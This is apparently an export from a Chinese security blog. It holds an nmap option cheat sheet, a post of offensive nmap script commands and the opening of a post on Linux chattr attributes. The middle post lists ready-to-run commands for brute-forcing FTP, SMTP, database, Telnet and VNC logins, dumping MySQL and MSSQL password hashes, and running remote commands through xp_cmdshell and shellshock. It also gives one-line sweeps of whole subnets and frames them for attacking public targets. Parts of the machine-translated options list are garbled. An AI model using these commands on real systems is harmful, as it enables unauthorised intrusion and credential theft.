<h4 id="端口规格和扫描-顺序：-p"><a href="#端口规格和扫描-顺序：-p" class="headerlink" title="端口规格和扫描 顺序：-p"></a>端口规格和扫描 顺序：-p</h4><p>&lt;端口范围&gt;：仅扫描指定的端口</p>
<ul>
<li>例如：-p22; -p1-65535; -p U：53,111,137，T：21-25,80,139,8080，S：9</li>
<li>-exclude-ports &lt;端口范围&gt;：从扫描中排除指定端口</li>
<li>-F：快速模式 – 扫描端口少于默认扫描</li>
<li>-r：连续扫描端口 – 不随机化</li>
<li>-top-ports <number>：扫描<number>最常用的端口</li>
<li>-port-ratio <ratio>：扫描比<ratio></li>
</ul>
<h4 id="服务-版本检测："><a href="#服务-版本检测：" class="headerlink" title="服务/版本检测："></a>服务/版本检测：</h4><ul>
<li>-sV：探测开放端口以确定服务/版本info</li>
<li>-version-intensity <level>：设置从0（亮）到9（尝试所有探测器）</li>
<li>-version-light：限制最可能的探测器2）</li>
<li>-version-all：尝试每个探测器（强度9）</li>
<li>-version-trace：显示详细版本的扫描活动（用于调试）</li>
</ul>
<h4 id="SCRIPT-SCAN："><a href="#SCRIPT-SCAN：" class="headerlink" title="SCRIPT SCAN："></a>SCRIPT SCAN：</h4><ul>
<li>-sC：相当于-script =默认</li>
<li>-script = &lt;Lua脚本&gt;：<Lua scripts>是逗号分隔的</li>
<li>目录列表，脚本文件或脚本类别</li>
<li>-script-args = &lt;n1 = v1，[ n2 = v2，…]&gt;：为脚本提供参数</li>
<li>-script-args-file = filename：在文件中提供NSE脚本参数</li>
<li>-script-trace：显示所有发送和接收的数据</li>
<li>-script-updatedb：更新脚本数据库。</li>
<li>-script-help = <Lua scripts>：显示有关脚本的帮助。</li>
<li><Lua scripts>是脚本文件或</li>
<li>脚本类别的逗号分隔列表。</li>
</ul>
<h4 id="操作系统检测："><a href="#操作系统检测：" class="headerlink" title="操作系统检测："></a>操作系统检测：</h4><ul>
<li>-O：启用操作系统检测</li>
<li>-osscan-limit：限制操作系统检测为有前途的目标</li>
<li>-osscan-guess：猜测操作系统更积极</li>
</ul>
<h4 id="时间和性能："><a href="#时间和性能：" class="headerlink" title="时间和性能："></a>时间和性能：</h4><ul>
<li>采用<code>&lt;time&gt;</code>的选项以秒为单位，或附加’ms’（毫秒），‘s’（秒），’m’（分钟）或’h’（小时） ）。</li>
<li>-T &lt;0-5&gt;：设置定时模板（更高更快）</li>
<li>-min-hostgroup / max-hostgroup <size>：并行主机扫描组大小</li>
<li>-min-parallelism / max-parallelism <numprobes>：探针并行化</li>
<li>-min- rtt-timeout / max-rtt-timeout / initial-rtt-timeout <time>：指定</li>
<li>探测往返时间。</li>
<li>-max-retries <tries>：端口扫描探测器重新传输的大小数量。</li>
<li>-host-timeout <time>：在这个long</li>
<li>-scan-delay 之后放弃目标/ -max-scan-delay <time>：调整探针之间的延迟</li>
<li>-min-rate <number>：</li>
<li>-max-rate <number>：发送数据包不超过每秒<number></li>
</ul>
<h4 id="防火墙-IDS消除和防盗："><a href="#防火墙-IDS消除和防盗：" class="headerlink" title="防火墙/ IDS消除和防盗："></a>防火墙/ IDS消除和防盗：</h4><ul>
<li>-f; -mtu <val>：片段数据包（可选w / given MTU）</li>
<li>-D &lt;decoy1，decoy2 [，ME]，…&gt;：用诱饵隐藏扫描</li>
<li>-S <IP_Address>：欺骗源地址</li>
<li>-e <iface>：使用指定的接口</li>
<li>-g / -source-port &lt;</li>
<li>portnum &gt;：使用给定的端口号-proxies &lt;url1，[url2]，…&gt;：通过HTTP / SOCKS4代理服务器的中继连接</li>
<li>-data &lt;十六进制字符串&gt;：将自定义有效内容附加到已发送数据包</li>
<li>-data-string <string>：将自定义ASCII字符串附加到已发送数据包</li>
<li>-data-length <num>：将随机数据附加到已发送数据包</li>
<li>-ip-options &lt;选项&gt;：发送指定ip选项的数据包</li>
<li>-ttl <val>：设置IP生存时间字段</li>
<li>-spoof-mac &lt;</li>
<li>-badsum：发送虚假TCP / UDP / SCTP校验和的数据包</li>
</ul>
<h4 id="OUTPUT"><a href="#OUTPUT" class="headerlink" title="OUTPUT"></a>OUTPUT</h4><ul>
<li>-oN / -oX / -oS / -oG <file>：分别以正常，XML，s | &lt;rIpt kIddi3</li>
<li>和Grepable格式输出扫描到给定的文件名。</li>
<li>-oA <basename>：一次输出三种主要格式</li>
<li>-v：提高详细级别（使用-vv或更多以获得更大效果）</li>
<li>-d：提高调试级别（使用-dd或更多以获得更大效果）</li>
<li>-reason：Display端口处于特定状态的原因</li>
<li>-open：只显示打开的（或可能打开的）端口</li>
<li>-packet-trace：显示所有发送和接收的数据包</li>
<li>-iflist：打印主机接口和路由（用于调试）</li>
<li>-log-errors：Log错误/警告到正常格式的输出文件</li>
<li>-append-output：附加到指定的输出文件而不是clobber</li>
<li>-resume <filename>：恢复中止的扫描</li>
<li>-stylesheet &lt;path / URL&gt;：XSL样式表将XML输出转换为HTML</li>
<li>-webxml：Nmap.Org的参考样式表，用于更多可移植的XML</li>
<li>-no-stylesheet：防止关联XSL样式表w / XML输出</li>
</ul>
<h4 id="MISC："><a href="#MISC：" class="headerlink" title="MISC："></a>MISC：</h4><ul>
<li>-6：启用IPv6扫描</li>
<li>-A：启用OS检测，版本检测，脚本扫描和traceroute</li>
<li>-datadir <dirname>：指定自定义Nmap数据文件位置</li>
<li>-send-eth / -send-ip：使用原始以太网帧进行发送或IP数据包</li>
<li>-privileged：假设用户具有完全特权</li>
<li>-unprivileged：假定用户缺少原始套接字权限</li>
<li>-V：打印版本号</li>
<li>-h：打印此帮助摘要页面</li>
</ul>
<h4 id="另见"><a href="#另见" class="headerlink" title="另见"></a>另见</h4><p>虽然它最为流行，但是 Nmap 不是唯一可用的端口扫描器，并且，取决于不同的喜好，可能也不是最好的。下面是 Kali 中包含的一些其它的替代品：</p>
<ul>
<li>unicornscan</li>
<li>hping3</li>
<li>masscan</li>
<li>amap</li>
<li>Metasploit scanning module</li>
</ul>
]]></content>
      <categories>
        <category>hacker</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title>nmap脚本检测</title>
    <url>/post/63116/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在实战中相对比较实用的nmap脚本</p>
<span id="more"></span>

<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"># nmap -sV -<span class="keyword">sT</span> -Pn –<span class="keyword">open</span> -v 192.168.3.23</span><br></pre></td></tr></table></figure>

<p>也可以尝试先获取下目标机器各个服务更详细的banner信息,因为有些服务工具漏洞只能影响特定的版本,所以,提前知道一下还是非常有必要的:</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"># nmap -<span class="keyword">sT</span> -Pn –<span class="keyword">open</span> -v banner.nse 192.168.3.23</span><br></pre></td></tr></table></figure>

<h3 id="和ftp相关的一些漏洞检测脚本"><a href="#和ftp相关的一些漏洞检测脚本" class="headerlink" title="和ftp相关的一些漏洞检测脚本:"></a>和ftp相关的一些漏洞检测脚本:</h3><p>ftp-anon.nse 检查目标ftp是否允许匿名登录,光能登陆还不够,它还会自动检测目录是否可读写,如,批量ftp抓鸡</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p 21 –script ftp-anon.nse -v 192.168.3.23</span></span><br></pre></td></tr></table></figure>

<p>ftp-brute.nse ftp爆破脚本 [只会尝试一些比较简单的弱口令,时间可能要稍微长一些(挂vpn以后这个爆破速度可能会更慢),毕竟,是直接在公网爆破]</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p 21 –script ftp-brute.nse -v 192.168.3.23</span></span><br></pre></td></tr></table></figure>

<p>ftp-vuln-cve2010-4221.nse ProFTPD 1.3.3c之前的netio.c文件中的pr_netio_telnet_gets函数中存在多个栈溢出</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"># nmap -p <span class="number">21</span> –script ftp-vuln-cve<span class="number">2010-4221</span>.nse -v <span class="number">192.168.3.23</span></span><br></pre></td></tr></table></figure>

<p>ftp-proftpd-backdoor.nse ProFTPD 1.3.3c 被人插后门[proftpd-1.3.3c.tar.bz2],缺省只执行id命令,可自行到脚本中它换成能直接弹shell的命令</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"># nmap -p <span class="number">21</span> –script ftp-vuln-cve<span class="number">2010-4221</span>.nse -v <span class="number">192.168.3.23</span></span><br></pre></td></tr></table></figure>

<p>ftp-vsftpd-backdoor.nse VSFTPD v2.3.4 跟Proftp同样的问题,被人插了后门</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="attr"># nmap -p 21</span> –script ftp-<span class="attr">vsftpd-backdoor.nse -v 192</span><span class="number">.168</span><span class="number">.3</span><span class="number">.23</span></span><br></pre></td></tr></table></figure>


<h3 id="和ssh-相关的一些扫描脚本"><a href="#和ssh-相关的一些扫描脚本" class="headerlink" title="和ssh 相关的一些扫描脚本:"></a>和ssh 相关的一些扫描脚本:</h3><p>sshv1.nse sshv1是可以中间人的</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p 22 –script sshv1.nse -v 192.168.3.23</span></span><br></pre></td></tr></table></figure>


<h3 id="和smtp-相关的一些扫描脚本"><a href="#和smtp-相关的一些扫描脚本" class="headerlink" title="和smtp 相关的一些扫描脚本:"></a>和smtp 相关的一些扫描脚本:</h3><p>smtp-brute.nse 简单爆破smtp</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p 25 –script smtp-brute.nse -v 192.168.3.23</span></span><br></pre></td></tr></table></figure>


<p>smtp-enum–users.nse 枚举目标smtp服务器的邮件用户名,前提是目标要存在此错误配置才行</p>
<figure class="highlight hsp"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p <span class="number">25</span> –script smtp-<span class="meta-keyword">enum</span>-users.nse -v <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span></span></span><br></pre></td></tr></table></figure>


<p>smtp-vuln-cve2010-4344.nse Exim 4.70之前版本中的string.c文件中的string_vformat函数中存在堆溢出</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"># nmap -p <span class="number">25</span> –script smtp-vuln-cve<span class="number">2010-4344</span>.nse -v <span class="number">192.168.3.23</span></span><br></pre></td></tr></table></figure>


<p>smtp-vuln-cve2011-1720.nse Postfix 2.5.13之前版本，2.6.10之前的2.6.x版本，2.7.4之前的2.7.x版本和2.8.3之前的2.8.x版本,存在溢出</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"># nmap -p <span class="number">25</span> –script smtp-vuln-cve<span class="number">2011-1720</span>.nse -v <span class="number">192.168.3.23</span></span><br></pre></td></tr></table></figure>

<p>smtp-vuln-cve2011-1764.nse Exim “dkim_exim_verify_finish()” 存在格式字符串漏洞,太老基本很难遇到了</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"># nmap -p <span class="number">25</span> –script smtp-vuln-cve<span class="number">2011-1764</span>.nse -v <span class="number">192.168.3.23</span></span><br></pre></td></tr></table></figure>

<h3 id="和pop3-相关的一些扫描脚本"><a href="#和pop3-相关的一些扫描脚本" class="headerlink" title="和pop3 相关的一些扫描脚本:"></a>和pop3 相关的一些扫描脚本:</h3><p>pop3-brute.nse pop简单弱口令爆破</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p 110 –script pop3-brute.nse -v 192.168.3.23</span></span><br></pre></td></tr></table></figure>

<h3 id="和imap-相关的一些扫描脚本"><a href="#和imap-相关的一些扫描脚本" class="headerlink" title="和imap 相关的一些扫描脚本:"></a>和imap 相关的一些扫描脚本:</h3><p>imap-brute.nse imap简单弱口令爆破</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"># nmap -p <span class="number">143,993</span> –script imap-brute.nse -v <span class="number">192.168.3.23</span></span><br></pre></td></tr></table></figure>

<h3 id="和dns-相关的一些漏洞扫描脚本"><a href="#和dns-相关的一些漏洞扫描脚本" class="headerlink" title="和dns 相关的一些漏洞扫描脚本:"></a>和dns 相关的一些漏洞扫描脚本:</h3><p>dns-zone-transfer.nse 检查目标ns服务器是否允许传送</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p 53 –script dns-zone-transfer.nse -v 192.168.3.23</span></span><br></pre></td></tr></table></figure>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line"># nmap -p <span class="number">53</span> –script dns-zone-<span class="built_in">transfer</span>.nse –script-args dns-zone-<span class="built_in">transfer</span>.domain=<span class="keyword">target</span>.org -v <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span></span><br></pre></td></tr></table></figure>

<p>hostmap-ip2hosts.nse 旁站查询,目测了一下脚本,用的ip2hosts的接口,不过该接口似乎早已停用,如果想继续用,可自行到脚本里把接口部分的代码改掉</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p80 –script hostmap-ip2hosts.nse 192.168.3.23</span></span><br></pre></td></tr></table></figure>


<h3 id="和各种数据库相关的扫描脚本"><a href="#和各种数据库相关的扫描脚本" class="headerlink" title="和各种数据库相关的扫描脚本:"></a>和各种数据库相关的扫描脚本:</h3><p>informix-brute.nse informix爆破脚本</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p 9088 –script informix-brute.nse 192.168.3.23</span></span><br></pre></td></tr></table></figure>


<p>mysql-empty-password.nse mysql 扫描root空密码</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">mysql-<span class="literal">empty</span>-password.nse mysql 扫描root空密码</span><br></pre></td></tr></table></figure>


<p>mysql-brute.nse mysql root弱口令简单爆破</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p 3306 –script mysql-brute.nse -v 192.168.3.23</span></span><br></pre></td></tr></table></figure>

<p>mysql-dump-hashes.nse 导出mysql中所有用户的hash</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p 3306 –script mysql-dump-hashes –script-args=’username=root,password=root’ 192.168.3.23</span></span><br></pre></td></tr></table></figure>

<p>mysql-vuln-cve2012-2122.nse Mysql身份认证漏洞[MariaDB and MySQL 5.1.61,5.2.11, 5.3.5, 5.5.22],利用条件有些苛刻 [需要目标的mysql是自己源码编译安装的,这样的成功率相对较高]</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"># nmap -p <span class="number">3306</span> –script mysql-vuln-cve<span class="number">2012-2122</span>.nse -v <span class="number">192.168.3.23</span></span><br></pre></td></tr></table></figure>


<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p <span class="number">445</span> –script ms-sql-<span class="literal">info</span>.nse -v <span class="number">203.124.11.0</span>/<span class="number">24</span> ms-sql-<span class="literal">info</span>.nse 扫描C段mssql</span><br></pre></td></tr></table></figure>

<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"># nmap -p <span class="number">1433</span> –script ms-sql-info.nse –script-args mssql.<span class="keyword">instance</span>-port=<span class="number">1433</span> -v <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>



<p>ms-sql-empty-password.nse 扫描mssql sa空密码</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"># nmap -p <span class="number">1433</span> –script ms-<span class="keyword">sql</span>-empty-<span class="keyword">password</span>.nse -v <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>


<p>ms-sql-brute.nse sa弱口令爆破</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p 1433 –script ms-sql-brute.nse -v 192.168.3.0/24</span></span><br></pre></td></tr></table></figure>


<p>ms-sql-xp-cmdshell.nse 利用xp_cmdshell,远程执行系统命令</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"># nmap -p 1433 –script ms-sql-xp-cmdshell –script-<span class="keyword">args</span> mssql.username=<span class="keyword">sa</span>,mssql.password=<span class="keyword">sa</span>,ms-sql-xp-cmdshell.cmd=“<span class="keyword">net</span> user <span class="keyword">test</span> <span class="keyword">test</span> /add” 192.168.3.0/24</span><br></pre></td></tr></table></figure>


<p>ms-sql-dump-hashes.nse 导出mssql中所有的数据库用户及密码hash</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p 1433 –script ms-sql-dump-hashes -v 192.168.3.0/24</span></span><br></pre></td></tr></table></figure>


<p>pgsql-brute.nse 尝试爆破postgresql</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p 5432 –script pgsql-brute -v 192.168.3.0/24</span></span><br></pre></td></tr></table></figure>


<p>oracle-brute-stealth.nse 尝试爆破oracle</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap –script oracle-brute-stealth -p 1521 –script-args oracle-brute-stealth.sid=ORCL -v 192.168.3.0/24</span></span><br></pre></td></tr></table></figure>


<p>oracle-brute.nse</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap –script oracle-brute -p 1521 –script-args oracle-brute.sid=ORCL -v 192.168.3.0/24</span></span><br></pre></td></tr></table></figure>


<p>mongodb-brute.nse 尝试爆破mongdb</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p 27017 –script mongodb-brute 192.168.3.0/24</span></span><br></pre></td></tr></table></figure>


<p>redis-brute.nse redis爆破</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p 6379 –script redis-brute.nse 192.168.3.0/24</span></span><br></pre></td></tr></table></figure>


<h3 id="和snmp相关的一些扫描脚本"><a href="#和snmp相关的一些扫描脚本" class="headerlink" title="和snmp相关的一些扫描脚本:"></a>和snmp相关的一些扫描脚本:</h3><p>snmp-brute.nse 爆破C段的snmp</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"># nmap -<span class="keyword">sU</span> –script snmp-brute –script-<span class="keyword">args</span> snmp-brute.communitiesdb=user.txt 192.168.3.0/24</span><br></pre></td></tr></table></figure>

<h3 id="和telnet相关的一些扫描脚本"><a href="#和telnet相关的一些扫描脚本" class="headerlink" title="和telnet相关的一些扫描脚本:"></a>和telnet相关的一些扫描脚本:</h3><p>telnet-brute.nse 简单爆破telnet</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p 23 –script telnet-brute –script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s -v 192.168.3.0/24</span></span><br></pre></td></tr></table></figure>

<h3 id="和ldap服务相关的一些利用脚本"><a href="#和ldap服务相关的一些利用脚本" class="headerlink" title="和ldap服务相关的一些利用脚本:"></a>和ldap服务相关的一些利用脚本:</h3><p>ldap-brute.nse 简单爆破ldap</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">nmap</span> -<span class="keyword">p</span> <span class="number">389</span> –script ldap-brute –script-<span class="keyword">args</span> ldap.base=’“<span class="keyword">cn</span>=users,dc=cqure,dc=net”‘ <span class="number">192.168</span>.<span class="number">3.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>


<h3 id="和各类web中间件-web集成环境相关的一些利用脚本"><a href="#和各类web中间件-web集成环境相关的一些利用脚本" class="headerlink" title="和各类web中间件,web集成环境相关的一些利用脚本:"></a>和各类web中间件,web集成环境相关的一些利用脚本:</h3><p>xmpp-brute.nse xmpp爆破</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p 5222 –script xmpp-brute.nse 192.168.3.0/24</span></span><br></pre></td></tr></table></figure>

<p>http-iis-short-name-brute.nse 短文件扫描</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p80 –script http-iis-short-name-brute.nse 192.168.3.0/24</span></span><br></pre></td></tr></table></figure>


<p>http-iis-webdav-vuln.nse iis 5.0 /6.0 webadv写</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"># nmap –script http-iis-webdav-vuln.nse -p<span class="number">80,8080 192</span>.<span class="number">168.3.0/24</span></span><br></pre></td></tr></table></figure>


<p>http-shellshock.nse bash远程执行</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">nmap</span> -sV -<span class="keyword">p</span>- –script http-shellshock –script-<span class="keyword">args</span> uri=/cgi-bin/bin,cmd=<span class="keyword">ls</span> <span class="number">192.168</span>.<span class="number">3.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>


<p>http-svn-info.nse 探测目标svn</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap –script http-svn-info 192.168.3.0/24</span></span><br></pre></td></tr></table></figure>

<p>http-drupal-enum.nse 其实对于这类的开源程序,我们根本没必要用nmap,因为搞多了,差不多一眼就能看出来</p>
<p>http-wordpress-brute.nse</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">nmap</span> -p80 -sV –script http-wordpress-brute –script-<span class="keyword">args</span> ‘userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.<span class="built_in">hostname</span>=domain.<span class="keyword">com</span>,http-wordpress-brute.threads=<span class="number">3</span>,brute.firstonly=true’ <span class="number">192.168</span>.<span class="number">3.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>



<p>http-backup-finder.nse 扫描目标网站备份</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p80 –script=http-backup-finder 192.168.3.0/24</span></span><br></pre></td></tr></table></figure>


<p>http-vuln-cve2015-1635.nse iis6.0远程代码执行</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># nmap -sV –script http-vuln-cve* –script-args uri=’<span class="regexp">/anotheruri/</span>’ <span class="number">192.168</span>.<span class="number">3.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<h3 id="跟vpn相关的一些利用脚本"><a href="#跟vpn相关的一些利用脚本" class="headerlink" title="跟vpn相关的一些利用脚本"></a>跟vpn相关的一些利用脚本</h3><p>pptp-version.nse 识别目标pptp版本</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p 1723 –script pptp-version.nse 192.168.3.0/24</span></span><br></pre></td></tr></table></figure>


<h3 id="smb漏洞检测脚本集"><a href="#smb漏洞检测脚本集" class="headerlink" title="smb漏洞检测脚本集:"></a>smb漏洞检测脚本集:</h3><ul>
<li>smb-vuln-ms08-067.nse</li>
<li>smb-vuln-ms10-054.nse</li>
<li>smb-vuln-ms10-061.nse</li>
<li>smb-vuln-ms17-010.nse smb远程执行</li>
</ul>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p445 –script smb-vuln-ms17-010.nse 192.168.3.0/24</span></span><br></pre></td></tr></table></figure>

<h3 id="检测内网嗅探"><a href="#检测内网嗅探" class="headerlink" title="检测内网嗅探"></a>检测内网嗅探</h3><p>sniffer-detect.nse</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -sn -Pn –script sniffer-detect.nse 192.168.3.0/24</span></span><br></pre></td></tr></table></figure>


<h3 id="其它的一些辅助性脚本"><a href="#其它的一些辅助性脚本" class="headerlink" title="其它的一些辅助性脚本:"></a>其它的一些辅助性脚本:</h3><p>rsync-brute.nse 爆破目标的rsync</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"># nmap -p <span class="number">873</span> –script rsync-brute –script-args ‘rsync-brute.<span class="keyword">module</span>=www’ <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>


<p>rlogin-brute.nse 爆破目标的rlogin</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p 513 –script rlogin-brute 192.168.3.0/24</span></span><br></pre></td></tr></table></figure>

<p>vnc-brute.nse 爆破目标的vnc</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap –script vnc-brute -p 5900 192.168.3.0/24</span></span><br></pre></td></tr></table></figure>

<p>pcanywhere-brute.nse 爆破pcanywhere</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -p 5631 –script=pcanywhere-brute 192.168.3.0/24</span></span><br></pre></td></tr></table></figure>

<p>nessus-brute.nse 爆破nessus,貌似现在已经不是1241端口了,实在是太老了,直接忽略吧</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap –script nessus-brute -p 1241 192.168.3.0/24</span></span><br></pre></td></tr></table></figure>

<p>nexpose-brute.nse 爆破nexpose</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap –script nexpose-brute -p 3780 192.168.0.0/24</span></span><br></pre></td></tr></table></figure>


<p>shodan-api.nse 配合shodan接口进行扫描,如果自己手里有0day,这个威力还是不可小觑的</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap –script shodan-api –script-args ‘shodan-api.target=192.168.0.0/24,shodan-api.apikey=SHODANAPIKEY’</span></span><br></pre></td></tr></table></figure>


<p>0x17 尝试利用nmap一句话进行目标C段常规漏洞扫描</p>
<p>实际测试中,会非常的慢,可能跑一个脚本验证时间都要很长,尤其在你的vps带宽不是很足,网络又不怎么好的时候,速度就更慢了,所以还是建议先大致扫一眼目标服务,然后再单独针对性的扫,这样实际的成功率可能会高很多,毕竟,不是像masscan或者zamp这种基于无状态的扫描:</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"># nmap -sT -Pn -v –script dns-<span class="type">zone</span>-transfer.nse,ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010<span class="number">-4221.</span>nse,http-backup-finder.nse,http-cisco-anyconnect.nse,http-iis-short-<span class="type">name</span>-brute.nse,http-put.nse,http-php-<span class="keyword">version</span>.nse,http-shellshock.nse,http-robots.txt.nse,http-svn-enum.nse,http-webdav-scan.nse,iis-buffer-overflow.nse,iax2-<span class="keyword">version</span>.nse,memcached-<span class="keyword">info</span>.nse,mongodb-<span class="keyword">info</span>.nse,msrpc-enum.nse,ms-<span class="keyword">sql</span>-<span class="keyword">info</span>.nse,mysql-<span class="keyword">info</span>.nse,nrpe-enum.nse,pptp-<span class="keyword">version</span>.nse,redis-<span class="keyword">info</span>.nse,rpcinfo.nse,samba-vuln-cve<span class="number">-2012</span>–<span class="number">1182.</span>nse,smb-vuln-ms08<span class="number">-067.</span>nse,smb-vuln-ms17<span class="number">-010.</span>nse,snmp-<span class="keyword">info</span>.nse,sshv1.nse,xmpp-<span class="keyword">info</span>.nse,tftp-enum.nse,teamspeak2-<span class="keyword">version</span>.nse <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p>尝试利用nmap一句话进行目标C段弱口令爆破,还是上面的问题,验证一个漏洞都要那么久,更不要说跑完一个弱口令字典,nmap默认的弱口令字典大概是5000左右,也就是说一个用户名就要跑大概5000次,估计你vps带宽再小点儿的话,这个就没什么谱了,毕竟我们是在公网,不是在内网,所以,还是建议最好不要同时加载很多个弱口令爆破脚本,如果实在没办法必须爆破,可以多花点儿时间,去搜集目标有价值的用户名,以此尽可能提高自己的命中率:</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># nmap -sT -v -Pn –script ftp-brute.nse,imap-brute.nse,smtp-brute.nse,pop3-brute.nse,mongodb-brute.nse,redis-brute.nse,ms-sql-brute.nse,rlogin-brute.nse,rsync-brute.nse,mysql-brute.nse,pgsql-brute.nse,oracle-sid-brute.nse,oracle-brute.nse,rtsp-url-brute.nse,snmp-brute.nse,svn-brute.nse,telnet-brute.nse,vnc-brute.nse,xmpp-brute.nse 192.168.0.0/24</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>hacker</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux文件的隐藏属性</title>
    <url>/post/1747/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Linux系统中的文件除了具备一般权限和特殊权限之外，还有一种隐藏权限，即被隐藏起来的权限，默认情况下不能直接被用户发觉。明明权限充足但却无法删除某个文件的情况，或者仅能在日志文件中追加内容而不能修改或删除内容，这在一定程度上阻止了黑客篡改系统日志的图谋，因此这种“奇怪”的文件也保障了Linux系统的安全性。</p>
<span id="more"></span>

<h3 id="chattr-命令"><a href="#chattr-命令" class="headerlink" title="chattr 命令"></a>chattr 命令</h3><p>chattr命令用于设置文件的隐藏权限，格式为“chattr [参数] 文件”。如果想要把某个隐藏功能添加到文件上，则需要在命令后面追加“+参数”，如果想要把某个隐藏功能移出文件，则需要追加“-参数”</p>
<p>共有以下8种模式：</p>
<ul>
<li>a：让文件或目录仅供附加用途；</li>
<li>b：不更新文件或目录的最后存取时间；</li>
<li>c：将文件或目录压缩后存放；</li>
<li>d：将文件或目录排除在倾倒操作之外；</li>
<li>i：不得任意更动文件或目录；</li>
<li>s：保密性删除文件或目录；</li>
<li>S：即时更新文件或目录；</li>
<li>u：预防意外删除。</li>
</ul>
<p>选项：</p>
<ul>
<li>-R：递归处理，将指令目录下的所有文件及子目录一并处理；</li>
